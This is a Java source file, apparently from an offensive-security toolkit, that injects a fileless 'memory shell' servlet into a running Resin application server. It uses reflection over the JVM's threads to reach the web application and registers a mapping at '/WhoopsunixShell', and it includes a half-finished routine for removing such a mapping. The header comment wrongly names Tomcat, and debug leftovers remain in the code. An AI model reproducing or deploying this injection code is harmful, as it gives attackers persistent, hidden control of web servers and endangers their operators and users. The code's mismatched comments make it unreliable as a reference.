package org.example.resin.memshell.unload;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.HashMap;

/**
 * @author Whoopsunix
 * JMX 获取 StandardContext 注入 Tomcat Servlet 型内存马
 * Tomcat 7 8 9
 */
public class UnloadResinServletExecMS {
    private static String NAME = "Whoopsunix";
    private static String PATTERN = "/WhoopsunixShell";
    private static String CLASSNAME = "ResinServletExecMS";

    static {
        try {
            UnloadResinServletExecMS resinListenerExecMS = new UnloadResinServletExecMS();

            Thread[] threads = (Thread[]) getFieldValue(Thread.currentThread().getThreadGroup(), "threads");
            for (int i = 0; i < threads.length; i++) {
                try {
                    Class cls = threads[i].currentThread().getContextClassLoader().loadClass("com.caucho.server.dispatch.ServletInvocation");
                    Object contextRequest = cls.getMethod("getContextRequest").invoke(null);
                    Object webapp = contextRequest.getClass().getMethod("getWebApp").invoke(contextRequest);

                    // todo 看要怎么取到那个
                    try {
                        Object _invocation = getFieldValue(contextRequest, "_invocation");
                        System.out.println("pppuri: " + getFieldValue(_invocation, "_uri"));
                    } catch (Exception e){

                    }

//                    if (isInject(webapp, resinListenerExecMS)) {
////                        break;
//                    }

                    inject(webapp, resinListenerExecMS);
                } catch (Exception e) {
                }
            }
        } catch (Exception e) {
        }
    }

    public static void inject(Object webapp, Object object) {
        try {
            String NAME = (String) getFieldValue(object, "NAME");
            String pattern = (String) getFieldValue(object, "PATTERN");
            Object servletMapping = Class.forName("com.caucho.server.dispatch.ServletMapping").newInstance();
            invokeMethod(servletMapping, "setServletClass", new Class[]{String.class}, new Object[]{object.getClass().getName()});
            invokeMethod(servletMapping, "setServletName", new Class[]{String.class}, new Object[]{NAME});
            invokeMethod(servletMapping, "addURLPattern", new Class[]{String.class}, new Object[]{pattern});
            invokeMethod(webapp, "addServletMapping", new Class[]{Class.forName("com.caucho.server.dispatch.ServletMapping")}, new Object[]{servletMapping});

        } catch (Exception e) {

        }
    }

    public static boolean isInject(Object webapp, Object object) {
        try {
            String NAME = (String) getFieldValue(object, "NAME");
            String PATTERN = (String) getFieldValue(object, "PATTERN");
            String CLASSNAME = (String) getFieldValue(object, "CLASSNAME");

            Object _servletManager = getFieldValue(webapp, "_servletManager");
            HashMap _servlets = (HashMap) getFieldValue(_servletManager, "_servlets");
            _servlets.remove(NAME);
            ArrayList _servletList = (ArrayList) getFieldValue(_servletManager, "_servletList");
            for (int j = 0; j < _servletList.size(); ++j) {
                String _servletName = (String) getFieldValue(_servletList.get(j), "_servletName");
                String _servletNameDefault = (String) getFieldValue(_servletList.get(j), "_servletNameDefault");
                if (_servletName.equals(NAME) && _servletNameDefault.equals(PATTERN)) {
                    _servletList.remove(j);
                }
            }

            // _servletMapper
            Object _servletMapper = getFieldValue(webapp, "_servletMapper");
            Object _servletMap = getFieldValue(_servletMapper, "_servletMap");
            ArrayList _regexps = (ArrayList) getFieldValue(_servletMap, "_regexps");
            for (int i = 0; i < _regexps.size(); i++) {
                try {
                    Object urlMap = _regexps.get(i);
                    Object _urlPattern = getFieldValue(urlMap, "_urlPattern");
                    if (_urlPattern.toString().equals(PATTERN)) {
                        _regexps.remove(i);
                    }
                } catch (Exception e) {

                }
            }
            HashMap _urlPatterns = (HashMap) getFieldValue(_servletMapper, "_urlPatterns");
            _urlPatterns.remove(NAME);

            // _servletMapper._servletManager
            _servletManager = getFieldValue(_servletMapper, "_servletManager");
            _servlets = (HashMap) getFieldValue(_servletManager, "_servlets");
            _servlets.remove(NAME);
            _servletList = (ArrayList) getFieldValue(_servletManager, "_servletList");
            for (int j = 0; j < _servletList.size(); ++j) {
                String _servletName = (String) getFieldValue(_servletList.get(j), "_servletName");
                String _servletNameDefault = (String) getFieldValue(_servletList.get(j), "_servletNameDefault");
                if (_servletName.equals(NAME) && _servletNameDefault.equals(PATTERN)) {
                    _servletList.remove(j);
                }
            }
            return true;


        } catch (Exception e) {

        }
        return false;
    }

    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }

    public static void invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) {
        try {
            Method method;
            try {
                method = obj.getClass().getDeclaredMethod(methodName, argsClass);
            } catch (NoSuchMethodException e) {
                method = obj.getClass().getSuperclass().getDeclaredMethod(methodName, argsClass);
            }
            method.setAccessible(true);
            method.invoke(obj, args);
        } catch (Exception e) {

        }
    }
}
